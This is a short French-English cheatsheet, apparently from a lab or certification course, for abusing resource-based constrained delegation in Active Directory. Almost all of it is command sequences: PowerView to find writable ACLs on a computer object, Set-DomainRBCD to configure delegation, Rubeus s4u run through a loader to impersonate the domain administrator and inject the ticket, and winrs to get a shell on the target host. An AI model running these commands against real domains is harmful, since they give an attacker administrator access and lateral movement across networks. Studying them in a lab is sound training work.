# Cheatsheet - RBCD

> [!summary] Objectif
> Abuser un droit d'écriture (`GenericWrite`) sur un objet computer : écrire `msDS-AllowedToActOnBehalfOf` puis S4U. Workflow : find write → set RBCD → verify → Rubeus s4u.

### Find the write path
```powershell
. C:\AD\Tools\PowerView.ps1
Find-InterestingDomainACL | Where-Object {$_.IdentityReferenceName -match 'ciadmin'}
```

### Configure RBCD
```powershell
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-studentx$' -Verbose
Get-DomainRBCD
```

### Abuse with Rubeus
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-studentX$ /aes256:<AES256_KEY> /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
winrs -r:dcorp-mgmt cmd
```

> [!note] Récupérer d'abord les clés machine de la student VM avant le s4u. Noter : object controlled, delegated machine, SPN target, user impersonated.

## Related
[[Cheatsheet - Delegation attacks]] · [[Cheatsheet - Lateral movement]] · [[Cheatsheet - Trusts et forêts]]
